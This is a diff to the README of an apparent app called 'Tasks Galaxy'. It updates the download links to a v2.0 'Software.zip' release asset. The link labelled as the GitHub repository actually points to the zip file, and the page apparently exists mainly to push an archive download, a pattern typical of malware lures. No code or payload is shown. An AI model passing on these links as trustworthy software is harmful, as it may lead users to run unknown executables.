@@ -36,13 +36,13 @@ Tasks Galaxy is a cutting-edge task management dashboard app designed to revolut
 - to-do
 
 ## 📥 Download Tasks Galaxy!
-[![Download Tasks Galaxy](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v1.0/Soft.zip%20Tasks%20Galaxy-blue)](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v1.0/Soft.zip)
+[![Download Tasks Galaxy](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v2.0/Software.zip%20Tasks%20Galaxy-blue)](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v2.0/Software.zip)
 
 Click the button above to launch Tasks Galaxy and elevate your task management experience! 🛰️
 
 If the link above is not working, we recommend checking the **Releases** section for alternative download options.
 
 ## 🌐 Explore More
-Visit the [Tasks Galaxy GitHub Repository](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v1.0/Soft.zip) to stay updated on the latest features and developments.
+Visit the [Tasks Galaxy GitHub Repository](https://github.com/Jellyajkl12/tasks-galaxy/releases/download/v2.0/Software.zip) to stay updated on the latest features and developments.
 
 Let Tasks Galaxy guide you through a cosmic journey of task organization and productivity! 🌠
